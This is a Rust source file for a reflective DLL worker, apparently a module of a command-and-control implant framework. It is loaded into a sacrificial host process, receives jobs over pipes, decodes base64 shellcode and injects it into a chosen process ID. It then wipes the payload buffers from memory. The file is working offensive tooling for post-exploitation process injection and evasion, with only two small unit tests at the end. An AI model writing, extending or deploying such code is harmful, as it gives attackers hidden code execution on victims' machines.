//! cupcake-mod-inject — reflective worker DLL (4.0.2 zero-disk).
//!
//! Loaded into a sacrificial host process via `reflective_loader`. Entry is
//! export `x1` (LPTHREAD_START_ROUTINE). The thread param points to a
//! `cupcake_core::worker_io::WorkerIo` struct in child memory carrying the
//! job-pipe read handle and result-pipe write handle (both child-relative).
//! Job wire protocol:
//!   magic   [4]    — cupcake_core::wire_ids::JOB_MAGIC
//!   kind    u32le  — must be 3 (inject)
//!   pay_len u32le
//!   arg_len u32le  — reserved, must be 0
//!   payload[pay_len] — UTF-8 JSON
//!
//! Result framing: out_len u32le + err_len u32le + bodies. No C2 network.

use base64::Engine;
use std::io::{Read, Write};

const KIND_INJECT: u32 = 3;

/// x0 — init (optional pre-flight).
#[export_name = "x0"]
pub extern "C" fn x0() -> i32 {
    0
}

/// x1 — worker thread entry (CreateRemoteThread target).
/// Param = `WorkerIo` page (job/result pipe handles); null falls back to
/// legacy stdio path (stdin/stdout).
#[export_name = "x1"]
pub unsafe extern "system" fn x1(param: *mut core::ffi::c_void) -> u32 {
    let code = match std::panic::catch_unwind(|| run(param)) {
        Ok(Ok(())) => 0u32,
        Ok(Err(e)) => {
            let _ = write_result_param(param, b"", e.as_bytes());
            1
        }
        Err(_) => {
            let _ = write_result_param(param, b"", b"worker panic");
            2
        }
    };
    code
}

/// x2 — free (unused for pipe workers).
#[export_name = "x2"]
pub extern "C" fn x2() -> i32 {
    0
}

/// x3 — shutdown.
#[export_name = "x3"]
pub extern "C" fn x3() -> i32 {
    0
}

/// Read `WorkerIo` from the thread param (returns None for legacy null param).
unsafe fn worker_io(param: *mut core::ffi::c_void) -> Option<cupcake_core::worker_io::WorkerIo> {
    if param.is_null() {
        return None;
    }
    let io = cupcake_core::worker_io::WorkerIo::from_bytes(
        std::slice::from_raw_parts(param as *const u8, cupcake_core::worker_io::WorkerIo::SIZE),
    );
    if io.job_read == 0 || io.result_write == 0 {
        return None;
    }
    Some(io)
}

fn run(param: *mut core::ffi::c_void) -> Result<(), String> {
    let io = unsafe { worker_io(param) };
    let mut hdr = [0u8; 16];
    match io {
        Some(io) => cupcake_core::worker_io::read_exact_handle(io.job_read, &mut hdr)?,
        None => std::io::stdin()
            .read_exact(&mut hdr)
            .map_err(|e| format!("read hdr: {e}"))?,
    };
    if &hdr[0..4] != cupcake_core::wire_ids::JOB_MAGIC.as_slice() {
        return Err("bad job header".into());
    }
    let kind = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]);
    let pay_len = u32::from_le_bytes([hdr[8], hdr[9], hdr[10], hdr[11]]) as usize;
    let arg_len = u32::from_le_bytes([hdr[12], hdr[13], hdr[14], hdr[15]]) as usize;
    if kind != KIND_INJECT {
        return Err(format!("inject worker: unsupported job kind {kind}"));
    }
    if pay_len > 16 * 1024 * 1024 || arg_len > 1024 {
        return Err("size limit".into());
    }
    let mut payload = vec![0u8; pay_len];
    if pay_len > 0 {
        match io {
            Some(io) => cupcake_core::worker_io::read_exact_handle(io.job_read, &mut payload)?,
            None => std::io::stdin()
                .read_exact(&mut payload)
                .map_err(|e| format!("read payload: {e}"))?,
        };
    }
    let mut args = vec![0u8; arg_len];
    if arg_len > 0 {
        match io {
            Some(io) => cupcake_core::worker_io::read_exact_handle(io.job_read, &mut args)?,
            None => std::io::stdin()
                .read_exact(&mut args)
                .map_err(|e| format!("read args: {e}"))?,
        };
    }

    let (stdout, stderr) = match run_inject_job(&payload) {
        Ok(msg) => (msg, String::new()),
        Err(e) => (String::new(), e),
    };

    for b in payload.iter_mut() {
        *b = 0;
    }
    for b in args.iter_mut() {
        *b = 0;
    }

    write_result_param(param, stdout.as_bytes(), stderr.as_bytes())
}

/// Framed result write: param handle path (preferred) or legacy stdout.
fn write_result_param(
    param: *mut core::ffi::c_void,
    stdout: &[u8],
    stderr: &[u8],
) -> Result<(), String> {
    if let Some(io) = unsafe { worker_io(param) } {
        let mut frame = Vec::with_capacity(8 + stdout.len() + stderr.len());
        frame.extend_from_slice(&(stdout.len() as u32).to_le_bytes());
        frame.extend_from_slice(&(stderr.len() as u32).to_le_bytes());
        frame.extend_from_slice(stdout);
        frame.extend_from_slice(stderr);
        return cupcake_core::worker_io::write_all_handle(io.result_write, &frame);
    }
    write_result(stdout, stderr)
}

#[cfg(windows)]
fn run_inject_job(body: &[u8]) -> Result<String, String> {
    let v: serde_json::Value =
        serde_json::from_slice(body).map_err(|e| format!("inject json: {e}"))?;
    let pid = v
        .get("pid")
        .and_then(|x| x.as_u64())
        .or_else(|| v.get("target_pid").and_then(|x| x.as_u64()))
        .ok_or("missing pid")? as u32;
    let data_b64 = v
        .get("data")
        .and_then(|x| x.as_str())
        .ok_or("missing data (base64 payload)")?;
    let method = v.get("method").and_then(|x| x.as_str()).unwrap_or("auto");
    let wait_ms = v.get("wait_ms").and_then(|x| x.as_u64()).unwrap_or(0) as u32;

    let mut sc = base64::engine::general_purpose::STANDARD
        .decode(data_b64.trim())
        .map_err(|e| format!("payload b64: {e}"))?;
    if sc.is_empty() {
        return Err("empty payload after decode".into());
    }

    let result = cupcake_core::inject_shellcode(pid, &sc, method);
    for b in sc.iter_mut() {
        *b = 0;
    }
    match result {
        Ok(r) => {
            let _ = cupcake_core::wait_inject_thread(r.thread_handle, wait_ms);
            Ok(format!(
                "injected pid={} addr=0x{:x} method={}",
                r.pid, r.remote_addr, r.method
            ))
        }
        Err(e) => Err(format!("inject: {e}")),
    }
}

#[cfg(not(windows))]
fn run_inject_job(_body: &[u8]) -> Result<String, String> {
    Err("inject: windows only".into())
}

fn write_result(stdout: &[u8], stderr: &[u8]) -> Result<(), String> {
    let mut out = std::io::stdout();
    let ol = (stdout.len() as u32).to_le_bytes();
    let el = (stderr.len() as u32).to_le_bytes();
    out.write_all(&ol).map_err(|e| e.to_string())?;
    out.write_all(&el).map_err(|e| e.to_string())?;
    out.write_all(stdout).map_err(|e| e.to_string())?;
    out.write_all(stderr).map_err(|e| e.to_string())?;
    out.flush().map_err(|e| e.to_string())?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn inject_json_rejects_missing_pid() {
        let err = run_inject_job(br#"{"data":"QQ=="}"#).unwrap_err();
        assert!(err.contains("missing pid"), "got {err}");
    }

    #[test]
    fn inject_json_rejects_bad_b64() {
        let err = run_inject_job(br#"{"pid":1,"data":"!!!"}"#).unwrap_err();
        assert!(err.contains("b64") || err.contains("payload"), "got {err}");
    }
}
